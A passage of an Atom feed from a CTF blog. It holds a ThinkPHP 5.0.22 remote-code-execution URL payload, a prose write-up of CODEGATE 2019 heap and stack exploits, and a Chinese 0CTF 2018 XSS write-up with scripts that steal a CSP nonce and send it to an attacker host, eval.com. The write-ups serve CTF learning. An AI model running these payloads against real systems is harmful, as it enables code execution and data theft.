      &lt;h4 id=&quot;thinkphp5-0-22&quot;&gt;&lt;a href=&quot;#thinkphp5-0-22&quot; class=&quot;headerlink&quot; title=&quot;thinkphp5.0.22&quot;&gt;&lt;/a&gt;thinkphp5.0.22&lt;/h4&gt;&lt;p&gt;开debug模式,&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://127.0.0.1:10080/thinkphp_5.0.22/public/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;get[]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web" scheme="http://kctf.github.io/categories/web/"/>
    
    
      <category term="代码审计" scheme="http://kctf.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CODEGATE 2019 PWN writeup</title>
    <link href="http://kctf.github.io/2019/01/27/CODEGATE-2019-PWN-writeup/"/>
    <id>http://kctf.github.io/2019/01/27/CODEGATE-2019-PWN-writeup/</id>
    <published>2019-01-27T12:06:00.000Z</published>
    <updated>2019-06-12T13:16:41.256Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>STILL LOVE PWN AND EXPLOIT</em></strong></p><h2 id="aeiou"><a href="#aeiou" class="headerlink" title="aeiou"></a>aeiou</h2><h3 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h3><p>It seems like a heap problem, but there is no loop in main function. We can only do action on time. When look into the programe, I find that there is a stack overflow in teach number function which address is 0x4013aa. The buff is only 0x1000, but we can input 0x10000. Obviously, it is a stack overflow vuln.</p><a id="more"></a><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>How to get the shell? First, check the security mechanism:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : FULL</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>As we can see, the canary is opened. We can’t just overwrite the return address directly, for there is the canary protection. </p><p>How to figure out the problem? Back to the programe, i find that the function is in a thread which is made by <code>pthread_create</code>. It is a little wired, i think it may be the key. </p><p>After searching in the internet, i found a technique to bypass canary. when a thread is created by <code>pthread_create</code> function, to ensure the thread has its own stack, process will use <code>TLS</code> to store the variable and things. So the <code>stack</code> is belonged to thread itself(<code>TLS</code>), and is created by <code>mmap</code> function. Canary is also under the stack,which is the <code>stack_guard</code> in the <code>tcbhead_t</code>struct.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>So the way we bypass the canary is that we input long buff and it will finaly overwrite the canary. With this way, we can do ROP attack easily. The full exp link is shown at the bottom.</p><h2 id="god-the-reum"><a href="#god-the-reum" class="headerlink" title="god-the-reum"></a>god-the-reum</h2><h3 id="vuln-1"><a href="#vuln-1" class="headerlink" title="vuln"></a>vuln</h3><p>the vuln is obvious, which is a <code>uaf</code> in <code>withdraw</code> function in <code>0xF2E</code>. The funtion free the heap pointer but does not clean the value of pointer, we can still use the pointer to do anything such as leaking.</p><h3 id="expolit"><a href="#expolit" class="headerlink" title="expolit"></a>expolit</h3><p>first, check the security mechanism: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>one thing we need to care is that this programe is run under the <code>libc 2.27</code>, which os is ubuntu 18.4. there is <code>tcache</code> in <code>libc 2.27</code>.</p><p>next, we need to leak heap address, we can use <code>withdraw</code> funtion to free a chunk to <code>tcache</code>, and then use <code>uaf</code> vuln (<code>withdraw</code> again) to free the same chunk(there is no check in <code>tcache</code>), then we can use <code>show</code> to leak the address of heap.</p><p>How to leak libc address? after leak the heap address, we can know the money we need to substract, so we can free the same chunk 7 times and the chunk will be put into <code>unsorted bin</code>. Then we can use <code>show</code> function to leak the libc address.</p><p>Now we get all the address we need, so we can use <code>developer</code> function to overwrite the tcache chain to get the memory which address is <code>__free_hook</code>, then we write <code>one gadget</code> address into <code>__free_hook</code>. </p><p>Finally, get the shell.</p><h2 id="maris-shop"><a href="#maris-shop" class="headerlink" title="maris_shop"></a>maris_shop</h2><h3 id="vuln-2"><a href="#vuln-2" class="headerlink" title="vuln"></a>vuln</h3><p>There is a <code>uaf</code> vuln. We can first create 16 carts. And when we buy all the carts, it will free all the carts but just set 15 carts pointer and leave the last ont unclean. That’s the pointer we can use to leak address and exploit.</p><h3 id="expolit-1"><a href="#expolit-1" class="headerlink" title="expolit"></a>expolit</h3><p>first, check the security mechanism: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : Partial</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>There is a small trick to bypass <code>money check</code>, which is we can use <code>0 amount</code>.</p><p>The whole process is shown as below:</p><ol><li>we create 16 carts. </li><li>we by all the carts, the programe will free all the pointer and leave the 15th pointer unclean. </li><li>we show the 15th pointer and leak the address of libc.</li><li>we add the 15th carts and make unsorted bin attack, which overwrite <code>stdin-&gt;_IO_buf_end</code> to point to <code>main_arena</code>.</li><li>we call fgets will overwrite the <code>stdin-&gt;vtable</code>, address of which  contains <code>one gadgets</code> .</li><li>get shell</li></ol><h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><p>all the exp is in my <a href="https://github.com/ray-cp/ctf-pwn/tree/master/codegate2019" target="_blank" rel="noopener">github</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;&lt;em&gt;STILL LOVE PWN AND EXPLOIT&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;aeiou&quot;&gt;&lt;a href=&quot;#aeiou&quot; class=&quot;headerlink&quot; title=&quot;aeiou&quot;&gt;&lt;/a&gt;aeiou&lt;/h2&gt;&lt;h3 id=&quot;vuln&quot;&gt;&lt;a href=&quot;#vuln&quot; class=&quot;headerlink&quot; title=&quot;vuln&quot;&gt;&lt;/a&gt;vuln&lt;/h3&gt;&lt;p&gt;It seems like a heap problem, but there is no loop in main function. We can only do action on time. When look into the programe, I find that there is a stack overflow in teach number function which address is 0x4013aa. The buff is only 0x1000, but we can input 0x10000. Obviously, it is a stack overflow vuln.&lt;/p&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://kctf.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://kctf.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="http://kctf.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018 0CTF final h4x0rs.date</title>
    <link href="http://kctf.github.io/2018/06/03/2018-0CTF-final-h4x0rs-date/"/>
    <id>http://kctf.github.io/2018/06/03/2018-0CTF-final-h4x0rs-date/</id>
    <published>2018-06-03T09:26:42.000Z</published>
    <updated>2019-06-12T13:16:41.256Z</updated>
    
    <content type="html"><![CDATA[<p>当时比赛时，差一点就解出来了。结束前半小时，才发觉获取nonce的漏洞点。</p><p>还是太菜了，否则能一跃第四。</p><p>这题其实挺有意思的， 赛后仔细想想，好像也不是太难。但是题目真心不错。</p><p>最后证实，这题有多种解法，但每一种解法，都感觉学到了很多。</p><p>题目链接：<a href="https://h4x0rs.date/" target="_blank" rel="noopener">https://h4x0rs.date/</a></p><a id="more"></a><p>由于这篇题解自己拖得时间有点长了，所以刚刚发现 lorexxar大佬的题解写的很棒了，大家可以看一下，我就不过多介绍题目了。而且我尽量写一些与他不同的。</p><p><a href="https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data" target="_blank" rel="noopener">https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data</a></p><h2 id="获取ID"><a href="#获取ID" class="headerlink" title="获取ID"></a>获取ID</h2><p>我们是通过一个比较简单的方式获取到的id。题目中存在一个id为msg标签可写内容。此时我们将自己资料改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">msg</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后构造链接report即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://h4x0rs.date/login.php?redict=profile.php?id=&#123;you_id&#125;%26msg=body&#123;background-img:url('//eval.com?id=</span><br></pre></td></tr></table></figure><h2 id="【非预期】通过iframe控制csp"><a href="#【非预期】通过iframe控制csp" class="headerlink" title="【非预期】通过iframe控制csp"></a>【非预期】通过iframe控制csp</h2><p>这个解法是刷出题人Twitter刷到的。</p><p><img src="http://img.5am3.com/img/180531/HdEkFhl6GE.png" alt="mark"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>因为题目本身是通过加载js，来实现csp的加载。此时csp是直接写到内容中的。可以影响到此标签后面的js的加载。（前面的无法影响）</p><p>所以，此时我们只要能提前想办法不让这个js加载即可。当时自己也是想过的，然而……没办法。</p><p>在这里，这位大佬用了iframe标签的csp属性。（貌似只有chrome可以用）</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>此时我们先构造user1的资料为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后再构造user2的资料为如下，从而加载恶意代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">/profile.php?id</span>=<span class="string">user1_ID</span> <span class="attr">csp</span>=<span class="string">"script-src 'unsafe-inline';"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，当我们访问user2资料时，便成功触发漏洞。</p><h2 id="【预期】拿到nonce，执行js"><a href="#【预期】拿到nonce，执行js" class="headerlink" title="【预期】拿到nonce，执行js"></a>【预期】拿到nonce，执行js</h2><p><a href="https://paper.seebug.org/166/#a-csscspdom-xss-three-way" target="_blank" rel="noopener">https://paper.seebug.org/166/#a-csscspdom-xss-three-way</a></p><p>之前自己一直想的是通过style来拿nonce，因为他有缓存。而且时间还可以。最后自己努力将时间控制在15s左右。但是发过去后发现，那边没有回显？自己chrome是66，bot是65。当时很迷，还问出题人来着。但出题人没有对这块进行答复，而是反问我，时间问题。并且说明bot只停留15s，你这样是不行的。</p><p>所以只好换思路。当时不知道脑子那根筋抽了，没想到自己加载他的js。最后比赛结束前半小时才发现这个问题。</p><p>然而因为需要一系列自动化脚本的编写。最终也没来得及写完。比赛结束后才勉强写出beta版本。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>此时因为缓存的原因，20s的缓存。也就是说，当前页面的静态文件时不会重新加载的。那么，我们在当前页面加载一个iframe，即<strong>eval.php</strong>，去加载js从而获取nonce。但是获取nonce需要传入id。</p><p>因为此时我们已经成功关注了admin，所以可以通过python在自己页面爬取到admin的id。</p><p>此时大概逻辑便有了。</p><p>1.获取到管理员id，并且传给服务器，保存到a.txt。</p><p>2.将user1的资料改为将eval.php作为iframe加载。eval.php会引入a.txt的id。</p><p>3.此时eval.php 成功拿到nonce，保存到b.txt。并且在5秒后加载user2的资料</p><p>4.紧接着，修改user2 的资料，写入evaljs，并且将b.txt中的nonce带上。</p><p>5.此时，一套流程便完成了。等待evaljs的执行即可。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>大概用了以下几个脚本。写完没来得及做测试环境就关了。最近虽然环境一直开着，但是有些事给耽误复现了。</p><p>也就是说…..至今还未复现。</p><p><strong>poc.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取管理员id</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAdminid</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> re.search(<span class="string">"id=([0-9a-zA-Z]*)\"&gt;admin2&lt;"</span> , requests.get(<span class="string">"https://h4x0rs.date/profile.php"</span> , cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"p28vu9m2h0uj7g04m73uo4fsm6"</span>&#125;).text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从服务器端a.txt获取nonce</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNonce</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> requests.get(<span class="string">"http://eval.com/a.txt"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改资料页内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reProfile</span><span class="params">(ec)</span>:</span></span><br><span class="line">url=<span class="string">"https://h4x0rs.date/profile.php"</span></span><br><span class="line">cookie=</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=8fut6nfo8f449hu3t6ft2qp3s3"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">"intro"</span>:ec,</span><br><span class="line"><span class="string">"submit"</span>:<span class="string">"submit"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(ec)</span><br><span class="line">r=requests.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送report</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendReport</span><span class="params">()</span>:</span></span><br><span class="line">codeurl=<span class="string">"https://h4x0rs.date/profile.php?id=428222d40f05cfc8f1a1f2b550b29952db37d2016899a9f2e0534f630739c1e4"</span></span><br><span class="line">requests.post(<span class="string">"https://h4x0rs.date/do_report.php"</span>,data=&#123;<span class="string">"url"</span>: codeurl,<span class="string">"submit"</span>: <span class="string">"submit"</span>&#125; , cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"p28vu9m2h0uj7g04m73uo4fsm6"</span>&#125;)</span><br><span class="line">print(<span class="string">"send url ok!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改user2资料页中的nonce</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeNonce</span><span class="params">(nonce)</span>:</span></span><br><span class="line">evalcode=<span class="string">"&lt;script src=//eval.com/eval.js nonce='"</span>+nonce+<span class="string">"''&gt;&lt;/script&gt;"</span></span><br><span class="line">reProfile(evalcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先获取到admin的id，并保存到b.txt</span></span><br><span class="line">id = getAdminid()</span><br><span class="line">requests.get(<span class="string">"http://eval.com/save_b.php?b="</span>+id)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送report，从而加载eval.php</span></span><br><span class="line">sendReport()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取nonce，并修改内容。</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">nonce=getNonce()</span><br><span class="line"><span class="keyword">if</span>(nonce !=<span class="string">''</span>):</span><br><span class="line">changeNonce(nonce)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p><strong>eval.php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;eval&lt;/title&gt;</span><br><span class="line">&lt;script src=&quot;https://h4x0rs.date/assets/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">         // 加载user2的资料页</span><br><span class="line">function aa()&#123;</span><br><span class="line">var iframe = document.createElement(&apos;iframe&apos;); </span><br><span class="line">iframe.src=&quot;https://h4x0rs.date/profile.php?id=1d70f9cca4ab0d188c0cc9524b0d92705607d9b0d2e3923841e8b194ac7601cc&quot;;  </span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">         </span><br><span class="line">$(document).ready( function () &#123;</span><br><span class="line">  //获取nonce</span><br><span class="line">           var m = $(&quot;meta[http-equiv=Content-Security-Policy]&quot;);</span><br><span class="line">  var nonce=m.attr(&quot;content&quot;);</span><br><span class="line"></span><br><span class="line">  // 通过savea.php将nonce保存为a.txt</span><br><span class="line">           var url=&quot;https://eval.com/save_a.php?a=&quot;;</span><br><span class="line">  var n0t = document.createElement(&quot;link&quot;);</span><br><span class="line">  n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">  n0t.setAttribute(&quot;href&quot;, url+nonce);</span><br><span class="line">  document.head.appendChild(n0t);</span><br><span class="line">           </span><br><span class="line">           //每3秒重新加载一次user2的资料</span><br><span class="line">  setInterval(&quot;aa()&quot;, 3000 )</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;https://h4x0rs.date/assets/csp.js?id=&lt;?php echo file_get_contents(&apos;b.txt&apos;);?&gt;&amp;page=profile.php&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>save_a.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"./a.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">    fwrite($myfile, $str);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">&#125;</span><br><span class="line">save($_GET[<span class="string">'a'</span>]);</span><br></pre></td></tr></table></figure><p><strong>save_b.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"./b.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">    fwrite($myfile, $str);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">&#125;</span><br><span class="line">save($_GET[<span class="string">'b'</span>]);</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这道题蛮棒的，话说l4wio大佬总是一次又一次刷新自己对xss的认识。最近0ctf，学到了很多套路。再一次感觉到xss的乐趣。想尽一切办法去bypass。但是切记不能忽视任何一个微小的细节。或许哪里就会是一个漏洞。</p><p>看过标答后，发现l4wio大佬的答案更有意思一点，在这里，我用了两个用户，而大佬，直接通过csrf修改admin资料，将admin作为第二个用户来构造xss。膜一下。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data" target="_blank" rel="noopener">https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data</a></li><li><a href="https://github.com/l4wio/CTF-challenges-by-me/blob/master/0ctf_final-2018/0ctf_tctf_2018_slides.pdf" target="_blank" rel="noopener">https://github.com/l4wio/CTF-challenges-by-me/blob/master/0ctf_final-2018/0ctf_tctf_2018_slides.pdf</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当时比赛时，差一点就解出来了。结束前半小时，才发觉获取nonce的漏洞点。&lt;/p&gt;
&lt;p&gt;还是太菜了，否则能一跃第四。&lt;/p&gt;
&lt;p&gt;这题其实挺有意思的， 赛后仔细想想，好像也不是太难。但是题目真心不错。&lt;/p&gt;
&lt;p&gt;最后证实，这题有多种解法，但每一种解法，都感觉学到了很多。&lt;/p&gt;
&lt;p&gt;题目链接：&lt;a href=&quot;https://h4x0rs.date/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://h4x0rs.date/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web" scheme="http://kctf.github.io/categories/web/"/>
    
    
      <category term="xss" scheme="http://kctf.github.io/tags/xss/"/>
    
      <category term="nonce绕过" scheme="http://kctf.github.io/tags/nonce%E7%BB%95%E8%BF%87/"/>
    
      <category term="0ctf" scheme="http://kctf.github.io/tags/0ctf/"/>
    
      <category term="csp" scheme="http://kctf.github.io/tags/csp/"/>
    
  </entry>
  
</feed>
